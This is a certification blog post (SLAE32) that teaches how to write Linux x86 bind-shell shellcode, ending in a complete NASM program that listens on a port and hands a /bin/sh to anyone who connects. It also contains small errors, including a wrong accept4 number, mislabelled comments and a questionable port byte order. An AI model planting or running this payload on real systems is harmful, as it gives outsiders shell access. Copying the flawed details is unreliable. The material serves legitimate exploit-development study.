---
title: "SLAE32 0x01: Shell_Bind_TCP Shellcode"
date: 2019-10-19
category: [SLAE32]
tags: [assembly, c, python, exploit development, bind shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/shell.jpg"
---
## Shell Bind TCP Objectives

Create a Shell_Bind_TCP shellcode that:
1. Binds to an easily configurable port number
2. Executes a shell on an incoming connection

### MSFVenom Shellcode Under the Microscope

A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 

While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes `socket` : `bind` : `listen` : `accept` : `dup2` : `execve`. 

We can analyze unistd_32.h to grab our syscall identifiers which give us the decimal syscall number which 
we will translate to hexidecimal in each code segment:

```c
egrep "_socket |_accept |_bind |_listen |_accept4 |_dup2 |_execve " unistd_32.h

#define __NR_execve 11	 [0xb]
#define __NR_dup2 63	 [0x3f]
#define __NR_socket 359	 [0x167]
#define __NR_bind 361	 [0x169]
#define __NR_listen 363	 [0x16B]
#define __NR_accept4 364 [0x16B]
```

Each serve a purpose in creating our bind shell. 

### Referencing MSF Goodies
```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 78 bytes for
us to compare to our generated shellcode:

```nasm
xor ebx,ebx  
mul ebx  
push ebx  
inc ebx  
push ebx  
push byte +0x2 
mov ecx,esp  
mov al,0x66  
int 0x80 ;;; socket 
pop ebx  
pop esi  
push edx  
push dword 0x5c110002 
push byte +0x10 
push ecx  
push eax  
mov ecx,esp  
push byte +0x66 
pop eax  
int 0x80 ;;; bind
mov [ecx+0x4],eax  
mov bl,0x4  
mov al,0x66  
int 0x80 ;;; listen
inc ebx  
mov al,0x66  
int 0x80 ;;; accept
xchg eax,ebx  
pop ecx  
push byte +0x3f 
pop eax  
int 0x80 ;;; dup2
dec ecx  
jns 0x32  
push dword 0x68732f2f 
push dword 0x6e69622f 
mov ebx,esp  
push eax  
push ebx  
mov ecx,esp  
mov al,0xb  
int 0x80 ;;; execve
```

## Building a TCP Bind Shell.

In this excercise, we will build a bind tcp shell using 6 syscalls. It is important to understand that there
many ways to build a bind shell. In this blog, I call each syscall directly using their hexidecimal referrence
rather than using socketcall in each code segment like in the metasploit bind shell disassembly example. This makes the
code just a bit longer but in my case, I wanted to understand both potentialities. 

### Socket
```nasm
global _start	; Standard start
		;
section .text	;
_start:		;

xor ebx, ebx	; Zero out registers before usage to avoid a logic error
xor ecx, ecx	;
xor edx, edx	;
xor edi, edi	;
mul cx		; ax = ax * cx (0)
;
; int socket(int domain, int type, int protocol) //
; syscall number: 359 (0x167)
;
; Argument Values:
; EBX -> domain = 2 (AF_INET/IPv4)
; ECX -> type = 1 (SOCK_STREAM/TCP)
; EDX -> protocol = 0 (IPPROTO_TCP)
;
; Note: For protocol, we could also use 6, as the man page for socket tells us,
; "Normally only a single protocol exists to support a particular socket type
;   within a given protocol family, in which case protocol can be specified
;   as 0."
;
mov eax, 0x167	; socket syscall	
mov bl, 2	; socket_family=AF_INET (0x2)
mov cl, 1	; socket_type=SOCK_STREAM (0x1)
mov dl, 0	; protocol=IPPROTO_IO (0x0) [edx was already 0]
int 0x80	; interrupt
```

### Bind
Now that we have created a socket, it is time to bind to a given port.

```nasm	
;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;
;syscall number: 361 (0x169)
;Argument Values:
;sockfd = value in eax returned by socket()
;the structure for sockaddr_in per 'man 7 ip' looks like:
;*addr = memory address of structure containing:
;  - sin_family: 0x0002 (AF_INET/IPv4)
;  - sin_port: 0x0539 (1337)
;  - sin_addr.s_addr: 0x00000000 (0.0.0.0)
;addrlen = 0x10 (16/sizeof(sockaddr_in))
;
mov esi, eax	 ; store sockfd in esi for later use
push esi	 ; store sockfd on stack

mov eax, 0x169   ; bind syscall
pop ebx 	 ; pop sockfd off stack into ebx
push edi	 ; push 0x00000000 (0.0.0.0) / sin.addr [last arg] to stack
push word 0x0539 ; push port 1337 to stack / sin_port
push word 0x0002 ; push AF_INET/IPV4 [2] to stack / sin_family
mov ecx, esp	 ; mov pointer of stack to ecx
mov edx, 0x10	 ; mov 16 bit address length to edx
int 0x80	 ; execute interrupt 
```

### Listen
Socket and bind are complete. Next we need to execute the listen syscall.

```nasm
;int listen(int sockfd, int backlog)	
;
;syscall number: 363 (0x16B)
;Arguement Values:
;sockfd = stored in esi (refers to a socket of type SOCK_STREAM)
;backlog = max length to which the queue of pending connections
;	   for sockfd may grow.
;
push 0x16B	; bind syscall
pop eax		; mov bind to eax
mov ebx, esi	; mov sockfd into ebx
mov ecx, 5	; set a backlog of 5 
int 0x80	; interrupt 
```

### Accept
Time to accept incomming connections.

```nasm
;int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags)
;
;syscall number: 364 (0x16C)
;Arguement Values:
;sockfd = stored in esi (refers to a socket of type SOCK_STREAM)
;*sockaddr = NULL (0x00)
;*addrlen = NULLL (0x00)
;flags = NULL
;
mov eax, 0x16C	; accept4 syscall
xor ecx, ecx	; 0x00 sockaddr
xor edx, edx	; 0x00 addrlen
xor esi, esi	; 0x00 flags
int 0x80	; interrupt
```

### Dup2
Redirect STDIN, STDOUT, STDERR.

```nasm
;int dup2(int oldfd, int newfd)
;
;syscal number: 63 (0x3F)
;Arguement Values
;oldfd = previous sockfd value returned by accept4
;newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

mov ecx, 0x3	; setting up a counter for the loop to iterate through
mov esi, eax	; preserve old sockfd from accept4

sockfd_func:	; create a function to reproduce the same actions
mov eax, 0x3F	; dup2 call
mov ebx, esi	; restore sockfd to oldfd arguement
dec cl		; decrement ecx to 2 then 1 then 0
int 0x80	; interrupt
jnz sockfd_func ; loop back to sockfd_func if not zero
```

### Execve
```nasm
; int execve(const char *filename, char *const argv[], char *const envp[]);
; syscall number: 11 (0xb)
;
; Argument Values:
; *filename = Memory address of a null terminated string "/bin/sh"
; *argv[] = [*"/bin/sh", 0x00000000]
; *envp = NULL

xor ecx, ecx

; This has to be pushed in reverse because of how things move to the stack
; Pushing /bin/sh null terminated string

push cx
push dword 0x68732f2f	; push / / s h
push dword 0x6e69622f 	; push / b i n

mov ebx, esp		; Store pointer to "/bin/sh" in ebx
push ecx 		; Push NULL
push ebx 		; Push *filename
mov ecx, esp 		; Store memory address pointing to memory address of "/bin/sh"
mov al, 0xb		; execve call
int 0x80 		; Execute SHELL
```

# Complete Assembly Program

```nasm
; shell_bind_tcp.nasm
; Author: Vincent Mentz

global _start	; Standard start
		;
section .text	;
_start:		;
	
	;socket
	xor ebx, ebx	; Zero out registers before usage to avoid a logic error
	xor ecx, ecx	;
	xor edx, edx	;
	xor edi, edi	;
	mul cx		; ax = ax * cx (0)
	mov eax, 0x167	; socket syscall	
	mov bl, 2	; socket_family=AF_INET (0x2)
	mov cl, 1	; socket_type=SOCK_STREAM (0x1)
	mov dl, 0	; protocol=IPPROTO_IO (0x0) [edx was already 0]
	int 0x80	; interrupt

	;bind
	mov esi, eax	 ; store sockfd in esi for later use
	push esi	 ; store sockfd on stack
	mov eax, 0x169   ; bind syscall
	pop ebx 	 ; pop sockfd off stack into ebx
	push edi	 ; push 0x00000000 (0.0.0.0) / sin.addr [last arg] to stack
	push word 0x0539 ; push port 1337 to stack / sin_port
	push word 0x0002 ; push AF_INET/IPV4 [2] to stack / sin_family
	mov ecx, esp	 ; mov pointer of stack to ecx
	mov edx, 0x10	 ; mov 16 bit address length to edx
	int 0x80	 ; execute interrupt 

	;listen
	push 0x16B	; bind syscall
	pop eax		; mov bind to eax
	mov ebx, esi	; mov sockfd into ebx
	mov ecx, 5	; set a backlog of 5 
	int 0x80	; interrupt 

	;accept4
	mov eax, 0x16C	; accept4 syscall
	xor ecx, ecx	; 0x00 sockaddr
	xor edx, edx	; 0x00 addrlen
	xor esi, esi	; 0x00 flags
	int 0x80	; interrupt

	;dup2
	mov ecx, 0x3	; setting up a counter for the loop to iterate through
	mov esi, eax	; preserve old sockfd from accept4
	sockfd_func:	; create a function to reproduce the same actions
	mov eax, 0x3F	; dup2 call
	mov ebx, esi	; restore sockfd to oldfd arguement
	dec cl		; decrement ecx to 2 then 1 then 0
	int 0x80	; interrupt
	jnz sockfd_func ; loop back to sockfd_func if not zero

	;execve
	xor ecx, ecx
	push cx
	push dword 0x68732f2f	; push / / s h
	push dword 0x6e69622f 	; push / b i n
	mov ebx, esp		; Store pointer to "/bin/sh" in ebx
	push ecx 		; Push NULL
	push ebx 		; Push *filename
	mov ecx, esp 		; Store memory address pointing to memory address of "/bin/sh"
	mov al, 0xb		; execve call
	int 0x80 		; Execute SHELL
```



...

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_
OA
